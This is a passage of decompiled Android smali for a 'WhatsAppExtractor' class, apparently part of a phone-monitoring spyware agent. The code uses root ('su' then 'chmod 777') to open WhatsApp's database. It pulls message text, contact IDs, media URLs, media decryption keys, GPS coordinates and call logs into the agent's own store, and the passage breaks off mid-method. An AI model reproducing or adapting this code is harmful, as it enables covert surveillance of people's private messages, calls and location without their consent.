.class public Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;
.super Ljava/lang/Object;
.source "WhatsAppExtractor.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field protected static final TAG:Ljava/lang/String; = "WAExtractor"

.field protected static final TEMP_FILE_NAME_PREFIX:Ljava/lang/String; = "waMsgTemp"


# instance fields
.field protected context:Lcom/hp/vd/context/Context;

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;

.field protected whatsappCallDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/WhatsAppCallData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected whatsappDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/WhatsAppData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field


# direct methods
.method public constructor <init>(Lcom/hp/vd/context/Context;Lcom/j256/ormlite/dao/Dao;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lcom/hp/vd/context/Context;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/WhatsAppData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/WhatsAppCallData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 41
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 35
    iput-object v0, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->context:Lcom/hp/vd/context/Context;

    .line 36
    iput-object v0, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->whatsappDao:Lcom/j256/ormlite/dao/Dao;

    .line 37
    iput-object v0, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->whatsappCallDao:Lcom/j256/ormlite/dao/Dao;

    .line 38
    iput-object v0, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 39
    iput-object v0, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 42
    iput-object p1, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->context:Lcom/hp/vd/context/Context;

    .line 43
    iput-object p2, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->whatsappDao:Lcom/j256/ormlite/dao/Dao;

    .line 44
    iput-object p3, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->whatsappCallDao:Lcom/j256/ormlite/dao/Dao;

    .line 45
    iput-object p4, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 46
    iput-object p5, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method protected chmod(Ljava/lang/String;)Z
    .locals 5

    .line 322
    iget-object v0, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 325
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v1

    const-string v2, "su"

    invoke-virtual {v1, v2}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v1

    .line 326
    new-instance v2, Ljava/io/DataOutputStream;

    invoke-virtual {v1}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 328
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "chmod 777 "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "\n"

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 330
    invoke-virtual {v2}, Ljava/io/DataOutputStream;->flush()V

    const-string p1, "exit\n"

    .line 332
    invoke-virtual {v2, p1}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 333
    invoke-virtual {v2}, Ljava/io/DataOutputStream;->flush()V

    .line 335
    invoke-virtual {v1}, Ljava/lang/Process;->waitFor()I
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    const/4 p1, 0x1

    return p1

    :catch_0
    move-exception p1

    const-string v1, "WAExtractor"

    const-string v2, "chmod(): InterruptedException"

    .line 343
    invoke-interface {v0, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    goto :goto_0

    :catch_1
    move-exception p1

    const-string v1, "WAExtractor"

    const-string v2, "chmod(): IOException"

    .line 340
    invoke-interface {v0, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :goto_0
    const/4 p1, 0x0

    return p1
.end method

.method protected cleanTempFilesFromPreviousInvocations(Ljava/lang/String;)V
    .locals 3

    .line 399
    :try_start_0
    new-instance v0, Ljava/io/File;

    iget-object v1, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 400
    new-instance v1, Lcom/hp/vd/module/monitor/whatsapp/StartsWithFilenameFilter;

    invoke-direct {v1, p1}, Lcom/hp/vd/module/monitor/whatsapp/StartsWithFilenameFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Ljava/io/File;->listFiles(Ljava/io/FilenameFilter;)[Ljava/io/File;

    move-result-object p1

    .line 402
    array-length v0, p1

    const/4 v1, 0x0

    :goto_0
    if-ge v1, v0, :cond_0

    aget-object v2, p1, v1

    .line 403
    invoke-virtual {v2}, Ljava/io/File;->delete()Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :catch_0
    move-exception p1

    .line 407
    iget-object v0, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "WAExtractor"

    const-string v2, "Throwable caught while deleting temp files from previous invocation at"

    invoke-interface {v0, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :cond_0
    return-void
.end method

.method public copy(Ljava/io/File;Ljava/io/File;)V
    .locals 7
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .line 384
    new-instance v0, Ljava/io/FileInputStream;

    invoke-direct {v0, p1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    .line 385
    new-instance p1, Ljava/io/FileOutputStream;

    invoke-direct {p1, p2}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 387
    invoke-virtual {v0}, Ljava/io/FileInputStream;->getChannel()Ljava/nio/channels/FileChannel;

    move-result-object v1

    .line 388
    invoke-virtual {p1}, Ljava/io/FileOutputStream;->getChannel()Ljava/nio/channels/FileChannel;

    move-result-object v6

    .line 390
    invoke-virtual {v1}, Ljava/nio/channels/FileChannel;->size()J

    move-result-wide v4

    const-wide/16 v2, 0x0

    invoke-virtual/range {v1 .. v6}, Ljava/nio/channels/FileChannel;->transferTo(JJLjava/nio/channels/WritableByteChannel;)J

    .line 392
    invoke-virtual {v0}, Ljava/io/FileInputStream;->close()V

    .line 393
    invoke-virtual {p1}, Ljava/io/FileOutputStream;->close()V

    return-void
.end method

.method protected extractCalls(Ljava/io/File;Landroid/database/sqlite/SQLiteDatabase;)V
    .locals 6

    const/4 p1, 0x0

    .line 236
    invoke-static {p1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 237
    invoke-static {p1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 239
    iget-object v0, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "wa_call_max_id"

    invoke-virtual {v0, v1}, Lcom/hp/vd/data/ModuleData;->customGetInt(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v0

    .line 243
    :try_start_0
    new-instance v1, Lcom/hp/vd/module/monitor/whatsapp/Columns;

    invoke-direct {v1}, Lcom/hp/vd/module/monitor/whatsapp/Columns;-><init>()V

    const-string v2, "select cl._id, cl.from_me, cl.video_call, cl.duration, cl.call_result, jid.user, cl.timestamp from call_log cl left join jid on jid._id = cl.jid_row_id where cl._id > ? order by cl._id ASC LIMIT ?"

    const/4 v3, 0x2

    .line 247
    new-array v3, v3, [Ljava/lang/String;

    .line 250
    invoke-virtual {v0}, Ljava/lang/Integer;->toString()Ljava/lang/String;

    move-result-object v4

    aput-object v4, v3, p1

    const/4 p1, 0x1

    const-string v4, "100"

    aput-object v4, v3, p1

    .line 247
    invoke-virtual {p2, v2, v3}, Landroid/database/sqlite/SQLiteDatabase;->rawQuery(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object p1

    if-nez p1, :cond_0

    .line 256
    iget-object p1, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string p2, "WAExtractor"

    const-string v1, "Cursor is null"

    const/4 v2, 0x3

    invoke-interface {p1, p2, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    :cond_0
    if-eqz p1, :cond_1

    move-object p2, v0

    .line 262
    :goto_0
    invoke-interface {p1}, Landroid/database/Cursor;->moveToNext()Z

    move-result v2

    if-eqz v2, :cond_2

    .line 263
    new-instance p2, Lcom/hp/vd/data/WhatsAppCallData;

    invoke-direct {p2}, Lcom/hp/vd/data/WhatsAppCallData;-><init>()V

    .line 265
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v2, "_id"

    invoke-interface {p1, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {p1, v2}, Landroid/database/Cursor;->getInt(I)I

    move-result v2

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    iput-object v2, p2, Lcom/hp/vd/data/WhatsAppCallData;->internalId:Ljava/lang/Integer;

    .line 268
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v2, "from_me"

    invoke-interface {p1, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {p1, v2}, Landroid/database/Cursor;->getInt(I)I

    move-result v2

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    iput-object v2, p2, Lcom/hp/vd/data/WhatsAppCallData;->fromMe:Ljava/lang/Integer;

    .line 269
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v2, "video_call"

    invoke-interface {p1, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {p1, v2}, Landroid/database/Cursor;->getInt(I)I

    move-result v2

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    iput-object v2, p2, Lcom/hp/vd/data/WhatsAppCallData;->videoCall:Ljava/lang/Integer;

    .line 270
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v2, "duration"

    invoke-interface {p1, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {p1, v2}, Landroid/database/Cursor;->getInt(I)I

    move-result v2

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    iput-object v2, p2, Lcom/hp/vd/data/WhatsAppCallData;->duration:Ljava/lang/Integer;

    .line 271
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v2, "call_result"

    invoke-interface {p1, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {p1, v2}, Landroid/database/Cursor;->getInt(I)I

    move-result v2

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    iput-object v2, p2, Lcom/hp/vd/data/WhatsAppCallData;->callResult:Ljava/lang/Integer;

    .line 272
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v2, "user"

    invoke-interface {p1, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {p1, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    iput-object v2, p2, Lcom/hp/vd/data/WhatsAppCallData;->remoteUser:Ljava/lang/String;

    .line 274
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v2, "timestamp"

    invoke-interface {p1, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {p1, v2}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v2

    invoke-static {v2, v3}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v2

    .line 275
    new-instance v3, Ljava/util/Date;

    invoke-virtual {v2}, Ljava/lang/Long;->longValue()J

    move-result-wide v4

    invoke-direct {v3, v4, v5}, Ljava/util/Date;-><init>(J)V

    iput-object v3, p2, Lcom/hp/vd/data/WhatsAppCallData;->createdAt:Ljava/util/Date;

    .line 277
    iget-object v2, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->whatsappCallDao:Lcom/j256/ormlite/dao/Dao;

    invoke-interface {v2, p2}, Lcom/j256/ormlite/dao/Dao;->create(Ljava/lang/Object;)I

    .line 279
    iget-object p2, p2, Lcom/hp/vd/data/WhatsAppCallData;->internalId:Ljava/lang/Integer;

    goto/16 :goto_0

    :cond_1
    move-object p2, v0

    .line 283
    :cond_2
    invoke-interface {p1}, Landroid/database/Cursor;->close()V

    .line 285
    iget-object p1, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "wa_call_max_id"

    invoke-virtual {p1, v1, p2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 287
    iget-object p1, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {p1}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object p1

    invoke-virtual {p1}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getModuleDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object p1

    .line 288
    iget-object v1, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-interface {p1, v1}, Lcom/j256/ormlite/dao/Dao;->update(Ljava/lang/Object;)I

    .line 290
    iget-object p1, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "WAExtractor"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "WA-CALL successfully extracted. "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v3, " to: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-interface {p1, v1, p2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception p1

    .line 293
    iget-object p2, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "WAExtractor"

    const-string v2, "Error extracting data."

    invoke-interface {p2, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 295
    iget-object p1, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string p2, "wa_call_max_id"

    invoke-virtual {p1, p2, v0}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    return-void
.end method

.method protected extractMessages(Ljava/io/File;Landroid/database/sqlite/SQLiteDatabase;)V
    .locals 6

    const/4 p1, 0x0

    .line 151
    invoke-static {p1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 152
    invoke-static {p1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 154
    iget-object v0, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "wa_max_id"

    invoke-virtual {v0, v1}, Lcom/hp/vd/data/ModuleData;->customGetInt(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v0

    .line 158
    :try_start_0
    new-instance v1, Lcom/hp/vd/module/monitor/whatsapp/Columns;

    invoke-direct {v1}, Lcom/hp/vd/module/monitor/whatsapp/Columns;-><init>()V

    const-string v2, "select m._id, m.key_remote_jid, m.key_from_me, m.data, m.timestamp, m.media_url, m.media_mime_type, m.media_wa_type, m.media_size, m.latitude, m.longitude, mm.media_key from messages m left join message_media mm on mm.message_row_id = m._id where m._id > ? ORDER BY m._id ASC LIMIT ?"

    const/4 v3, 0x2

    .line 162
    new-array v3, v3, [Ljava/lang/String;

    .line 165
    invoke-virtual {v0}, Ljava/lang/Integer;->toString()Ljava/lang/String;

    move-result-object v4

    aput-object v4, v3, p1

    const/4 v4, 0x1

    const-string v5, "400"

    aput-object v5, v3, v4

    .line 162
    invoke-virtual {p2, v2, v3}, Landroid/database/sqlite/SQLiteDatabase;->rawQuery(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object p2

    if-nez p2, :cond_0

    .line 171
    iget-object p1, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string p2, "WAExtractor"

    const-string v1, "Cursor is null"

    const/4 v2, 0x3

    invoke-interface {p1, p2, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    :cond_0
    if-eqz p2, :cond_2

    move-object v2, v0

    .line 177
    :goto_0
    invoke-interface {p2}, Landroid/database/Cursor;->moveToNext()Z

    move-result v3

    if-eqz v3, :cond_3

    .line 178
    new-instance v2, Lcom/hp/vd/data/WhatsAppData;

    invoke-direct {v2}, Lcom/hp/vd/data/WhatsAppData;-><init>()V

    .line 180
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "_id"

    invoke-interface {p2, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {p2, v3}, Landroid/database/Cursor;->getInt(I)I

    move-result v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    iput-object v3, v2, Lcom/hp/vd/data/WhatsAppData;->internalId:Ljava/lang/Integer;

    .line 183
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "key_remote_jid"

    invoke-interface {p2, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {p2, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    iput-object v3, v2, Lcom/hp/vd/data/WhatsAppData;->keyRemoteJid:Ljava/lang/String;

    .line 184
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "key_from_me"

    invoke-interface {p2, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {p2, v3}, Landroid/database/Cursor;->getInt(I)I

    move-result v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    iput-object v3, v2, Lcom/hp/vd/data/WhatsAppData;->keyFromMe:Ljava/lang/Integer;

    .line 185
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "data"

    invoke-interface {p2, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {p2, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    iput-object v3, v2, Lcom/hp/vd/data/WhatsAppData;->data:Ljava/lang/String;

    .line 186
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "timestamp"

    invoke-interface {p2, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {p2, v3}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v3

    invoke-static {v3, v4}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v3

    iput-object v3, v2, Lcom/hp/vd/data/WhatsAppData;->timestamp:Ljava/lang/Long;

    .line 189
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "media_url"

    invoke-interface {p2, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {p2, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    iput-object v3, v2, Lcom/hp/vd/data/WhatsAppData;->mediaUrl:Ljava/lang/String;

    .line 190
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "media_mime_type"

    invoke-interface {p2, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {p2, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    iput-object v3, v2, Lcom/hp/vd/data/WhatsAppData;->mediaMimeType:Ljava/lang/String;

    .line 191
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "media_wa_type"

    invoke-interface {p2, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {p2, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    iput-object v3, v2, Lcom/hp/vd/data/WhatsAppData;->mediaWaType:Ljava/lang/String;

    .line 192
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "media_size"

    invoke-interface {p2, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {p2, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    iput-object v3, v2, Lcom/hp/vd/data/WhatsAppData;->mediaSize:Ljava/lang/String;

    .line 194
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "media_key"

    invoke-interface {p2, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {p2, v3}, Landroid/database/Cursor;->getBlob(I)[B

    move-result-object v3

    if-eqz v3, :cond_1

    .line 195
    array-length v4, v3

    if-lez v4, :cond_1

    .line 196
    invoke-static {v3, p1}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v3

    iput-object v3, v2, Lcom/hp/vd/data/WhatsAppData;->mediaKey:Ljava/lang/String;

    .line 200
    :cond_1
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "latitude"

    invoke-interface {p2, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {p2, v3}, Landroid/database/Cursor;->getDouble(I)D

    move-result-wide v3

    invoke-static {v3, v4}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object v3

    iput-object v3, v2, Lcom/hp/vd/data/WhatsAppData;->latitude:Ljava/lang/Double;

    .line 201
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "longitude"

    invoke-interface {p2, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {p2, v3}, Landroid/database/Cursor;->getDouble(I)D

    move-result-wide v3

    invoke-static {v3, v4}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object v3

    iput-object v3, v2, Lcom/hp/vd/data/WhatsAppData;->longitude:Ljava/lang/Double;

    .line 203
    new-instance v3, Ljava/util/Date;

    iget-object v4, v2, Lcom/hp/vd/data/WhatsAppData;->timestamp:Ljava/lang/Long;

    invoke-virtual {v4}, Ljava/lang/Long;->longValue()J

    move-result-wide v4

    invoke-direct {v3, v4, v5}, Ljava/util/Date;-><init>(J)V

    iput-object v3, v2, Lcom/hp/vd/data/WhatsAppData;->createdAt:Ljava/util/Date;

    .line 205
    iget-object v3, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->whatsappDao:Lcom/j256/ormlite/dao/Dao;

    invoke-interface {v3, v2}, Lcom/j256/ormlite/dao/Dao;->create(Ljava/lang/Object;)I

    .line 207
    iget-object v2, v2, Lcom/hp/vd/data/WhatsAppData;->internalId:Ljava/lang/Integer;

    goto/16 :goto_0

    :cond_2
    move-object v2, v0

    .line 211
    :cond_3
    invoke-interface {p2}, Landroid/database/Cursor;->close()V

    .line 213
    iget-object p1, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string p2, "wa_max_id"

    invoke-virtual {p1, p2, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 215
    iget-object p1, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {p1}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object p1

    invoke-virtual {p1}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getModuleDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object p1

    .line 216
    iget-object p2, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-interface {p1, p2}, Lcom/j256/ormlite/dao/Dao;->update(Ljava/lang/Object;)I

    .line 218
    iget-object p1, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string p2, "WAExtractor"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "WA successfully extracted. "

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

